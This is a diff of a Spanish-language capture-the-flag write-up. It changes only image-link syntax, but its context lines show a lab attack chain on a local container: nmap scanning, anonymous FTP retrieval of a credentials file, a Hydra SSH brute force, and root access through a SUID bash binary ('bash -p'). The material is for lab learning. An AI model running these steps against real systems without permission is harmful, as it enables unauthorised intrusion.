@@ -19,7 +19,7 @@ nmap -p- -sS --min-rate 5000 -n -vvv -Pn -sC -sV -oN ports 172.17.0.2
 
 **Resultados:**
 
-![[Writeup/whoami-labs/images/IMG-20260624180929272.png]]
+![img](images/IMG-20260624180929272.png)
 
 
 **Análisis:**
@@ -47,7 +47,7 @@ ftp 172.17.0.2
     
 - Contraseña: (vacía) 
 
-![[Writeup/whoami-labs/images/IMG-20260624181024699.png]]
+![img](images/IMG-20260624181024699.png)
 
 
 **Explorando el FTP:**
@@ -56,14 +56,14 @@ ftp 172.17.0.2
 ftp> ls
 ```
 
-![[Writeup/whoami-labs/images/IMG-20260624181107710.png]]
+![img](images/IMG-20260624181107710.png)
 
 ```bash
 ftp> cd pub
 ftp> ls
 ```
 
-![[Writeup/whoami-labs/images/IMG-20260624181146057.png]]
+![img](images/IMG-20260624181146057.png)
 
 
 **Hallazgo crítico:** Encontramos un archivo `usuarios.txt` en el directorio `pub`.
@@ -75,7 +75,7 @@ ftp> get usuarios.txt
 ftp> exit
 ```
 
-![[Writeup/whoami-labs/images/IMG-20260624181227146.png]]
+![img](images/IMG-20260624181227146.png)
 
 ---
 
@@ -87,7 +87,7 @@ Accedemos a la página web para verificar si hay información adicional.
 http://172.17.0.2/
 ```
 
-![[Writeup/whoami-labs/images/IMG-20260624181304689.png]]
+![img](images/IMG-20260624181304689.png)
 
 **Observaciones:**
 
@@ -108,7 +108,7 @@ http://172.17.0.2/
 cat usuarios.txt
 ```
 
-![[Writeup/whoami-labs/images/IMG-20260624181346563.png]]
+![img](images/IMG-20260624181346563.png)
 
 **Observaciones:**
 
@@ -136,13 +136,13 @@ cut -d: -f2 usuarios.txt > passwd.txt
 cat users.txt
 ```
 
-![[Writeup/whoami-labs/images/IMG-20260624181426539.png]]
+![img](images/IMG-20260624181426539.png)
 
 ```bash
 cat passwd.txt
 ```
 
-![[Writeup/whoami-labs/images/IMG-20260624181449860.png]]
+![img](images/IMG-20260624181449860.png)
 
 ### Ataque con Hydra (SSH)
 
@@ -154,7 +154,7 @@ hydra -L users.txt -P passwd.txt ssh://172.17.0.2 -t 4 -f
 
 **Resultado esperado:**
 
-![[Writeup/whoami-labs/images/IMG-20260624181854535.png]]
+![img](images/IMG-20260624181854535.png)
 
 ### Conexión SSH
 
@@ -184,7 +184,7 @@ ssh alberto@172.17.0.2
 
 **Conexión exitosa:**
 
-![[Writeup/whoami-labs/images/IMG-20260624181943988.png]]
+![img](images/IMG-20260624181943988.png)
 
 ---
 
@@ -198,7 +198,7 @@ ssh alberto@172.17.0.2
 bash-5.2$ whoami
 ```
 
-![[Writeup/whoami-labs/images/IMG-20260624182016028.png]]
+![img](images/IMG-20260624182016028.png)
 
 **2. Verificar permisos `sudo`:**
 
@@ -206,7 +206,7 @@ bash-5.2$ whoami
 bash-5.2$ sudo -l
 ```
 
-![[Writeup/whoami-labs/images/IMG-20260624182054517.png]]
+![img](images/IMG-20260624182054517.png)
 
 **Conclusión:** El usuario `alberto` no tiene permisos `sudo`.
 
@@ -216,7 +216,7 @@ bash-5.2$ sudo -l
 bash-5.2$ find / -perm -4000 2>/dev/null
 ```
 
-![[Writeup/whoami-labs/images/IMG-20260624182149061.png]]
+![img](images/IMG-20260624182149061.png)
 
 **Hallazgo crítico:** `/usr/bin/bash` tiene el bit SUID activado.
 
@@ -226,20 +226,20 @@ bash-5.2$ find / -perm -4000 2>/dev/null
 bash-5.2$ /usr/bin/bash -p
 ```
 
-![[Writeup/whoami-labs/images/IMG-20260624182218436.png]]
+![img](images/IMG-20260624182218436.png)
 
 ```
 bash-5.2# whoami
 ```
 
-![[Writeup/whoami-labs/images/IMG-20260624182315215.png]]
+![img](images/IMG-20260624182315215.png)
 ### Captura de la Flag
 
 ```bash
 bash-5.2# cd /root
 ```
 
-![[Writeup/whoami-labs/images/IMG-20260624182401122.png]]
+![img](images/IMG-20260624182401122.png)
 
 ---
 
